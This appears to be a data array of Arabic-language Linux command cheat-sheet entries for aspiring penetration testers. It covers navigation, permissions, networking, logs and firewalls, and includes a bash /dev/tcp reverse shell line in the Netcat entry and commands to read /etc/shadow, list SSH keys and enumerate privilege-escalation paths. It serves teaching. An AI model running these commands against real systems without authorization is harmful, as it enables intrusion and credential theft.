    {n:"التنقل ls cd pwd",d:"أهم أوامر التنقل",l:"مبتدئ",c:"pwd           # Print Working Directory\nls            # List files\nls -la        # All + details\ncd /home      # Go to /home\ncd ..         # Go up\ncd ~          # Home directory\ncd -          # Previous directory"},
    {n:"إنشاء وحذف ملفات",d:"التعامل مع الملفات والمجلدات",l:"مبتدئ",c:"mkdir mydir       # Create directory\nmkdir -p a/b/c    # Create nested\ntouch file.txt    # Create empty file\nrm file.txt       # Delete file\nrm -rf mydir/     # Delete dir\ncp file copy.txt  # Copy\nmv old new.txt    # Move/Rename"},
    {n:"قراءة الملفات cat less head tail",d:"عرض محتوى الملفات",l:"مبتدئ",c:"cat file.txt        # Show file\ncat -n file.txt     # With line numbers\nless file.txt       # Page by page (q=quit)\nhead -n 10 file.txt # First 10 lines\ntail -n 10 file.txt # Last 10 lines\ntail -f /var/log/syslog  # Live logs"},
    {n:"البحث grep find",d:"البحث عن ملفات ونصوص",l:"متوسط",c:"grep password file.txt        # Search text\ngrep -r admin /var/www/       # Recursive\ngrep -i root /etc/passwd      # Case insensitive\nfind / -name '*.conf'         # Find by name\nfind / -perm -4000 2>/dev/null # SUID files\nfind /home -user root         # Find by owner"},
    {n:"الصلاحيات chmod chown",d:"إدارة صلاحيات الملفات",l:"متوسط",c:"ls -l file.txt       # -rwxr-xr--\n# r=4, w=2, x=1\nchmod 777 file.txt   # All permissions\nchmod 755 script.sh  # rwxr-xr-x\nchmod +x script.sh   # Add execute\nchown user:group file.txt\nchown -R www-data /var/www/"},
    {n:"المستخدمون والصلاحيات",d:"whoami id sudo",l:"مبتدئ",c:"whoami          # Current user\nid              # uid gid groups\nsudo command    # Run as root\nsudo -l         # List sudo perms\nsu username     # Switch user\ncat /etc/passwd # All users\ncat /etc/shadow # Password hashes (root)"},
    {n:"الشبكة ifconfig ip ping",d:"أوامر الشبكة",l:"متوسط",c:"ifconfig        # Network interfaces\nip addr         # Interfaces (new)\nping -c 4 google.com\nnetstat -tulnp  # Open ports\ncurl http://site.com\nwget http://site.com/file\nnslookup google.com"},
    {n:"العمليات ps kill top",d:"مراقبة العمليات",l:"متوسط",c:"ps aux          # All processes\nps aux | grep apache\ntop             # Live monitor\nkill PID        # Kill process\nkill -9 PID     # Force kill\npkill apache2   # Kill by name"},
    {n:"Piping & Redirection",d:"ربط الأوامر — أقوى ميزة في Linux",l:"متوسط",c:"ls | grep '.txt'    # Pipe\ncat /etc/passwd | cut -d: -f1  # Usernames\ncmd > output.txt    # Redirect to file\ncmd >> output.txt   # Append\ncmd 2>/dev/null     # Discard errors\ncmd1 && cmd2        # Run if first ok\ncmd1 || cmd2        # Run if first fails"},
    {n:"SSH الاتصال الآمن",d:"الاتصال بالسيرفرات عن بُعد",l:"متوسط",c:"ssh user@10.0.0.1         # Connect\nssh -p 2222 user@host     # Custom port\nssh -i key.pem user@host  # Private key\nssh-keygen -t rsa         # Generate keys\nscp file.txt user@host:/tmp/  # Copy file\nscp -r dir/ user@host:/tmp/   # Copy dir"},
    {n:"Netcat السكين السويسرية",d:"أداة الشبكة الأقوى",l:"متقدم",c:"nc -lvnp 4444              # Listen\nnc 10.0.0.1 4444           # Connect\nnc -zv 10.0.0.1 1-1024     # Port scan\n# Reverse shell:\nbash -i >& /dev/tcp/10.0.0.1/4444 0>&1"},
    {n:"Cron Jobs",d:"جدولة المهام — مصدر شائع للـ PrivEsc",l:"متقدم",c:"crontab -e   # Edit cron\ncrontab -l   # List cron\n# min hour day month weekday cmd\n# 0 2 * * * /backup.sh = daily 2am\n# */5 * * * * /check.sh = every 5min\ncat /etc/crontab\nls /etc/cron.d/"},
    {n:"ملفات مهمة للـ Pentester",d:"أهم الملفات",l:"متوسط",c:"cat /etc/passwd     # Users\ncat /etc/shadow     # Hashes (root)\ncat /etc/hosts      # DNS static\ncat /proc/version   # Kernel\ncat /etc/crontab    # Cron jobs\nls -la ~/.ssh/      # SSH keys\nls /home/           # Other users"},
    {n:"Privilege Escalation",d:"رفع الصلاحيات لـ root",l:"متقدم",c:"sudo -l                          # Sudo perms\nfind / -perm -4000 2>/dev/null   # SUID\nfind / -writable -type d 2>/dev/null\nps aux | grep root               # Root processes\nuname -a                         # Kernel version\nenv                              # Environment vars\ncat /etc/crontab                 # Cron jobs"},
    {n:"Text Processing awk sed",d:"معالجة النصوص",l:"متقدم",c:"cat /etc/passwd | cut -d: -f1    # Usernames\nps aux | awk '{print $1,$11}'    # User+cmd\nsed 's/old/new/g' file.txt       # Replace\ngrep -v '^#' file.txt            # No comments\nsort file.txt | uniq -c          # Count unique\nwc -l file.txt                   # Line count"},
    {n:"Log Analysis",d:"تحليل ملفات اللوق",l:"متوسط",c:"cat /var/log/auth.log            # Auth logs\ngrep Failed /var/log/auth.log    # Failed logins\ncat /var/log/apache2/access.log  # Web logs\ntail -f /var/log/syslog          # Live logs\njournalctl -u ssh                # SSH logs\njournalctl --since today         # Today"},
    {n:"Package Management",d:"تثبيت البرامج",l:"مبتدئ",c:"apt update                 # Update list\napt install nmap           # Install\napt upgrade                # Upgrade all\napt remove nmap            # Remove\npip install requests       # Python packages\npip3 install paramiko\nsnap install code"},
    {n:"Bash Useful Tips",d:"أفضل الحيل",l:"متوسط",c:"history          # Command history\n!!               # Repeat last\nCtrl+R           # Search history\nlsof -i :80      # Who uses port 80\nuname -a         # System info\ndf -h            # Disk usage\nfree -h          # Memory\nuptime           # System uptime"},
    {n:"iptables Firewall",d:"جدار الحماية في Linux",l:"متقدم",c:"iptables -L                    # List rules\niptables -A INPUT -p tcp --dport 22 -j ACCEPT\niptables -A INPUT -j DROP\niptables -P FORWARD DROP\niptables-save > /etc/iptables.rules\n# UFW (easier):\nufw enable\nufw allow 22\nufw deny 3306"}
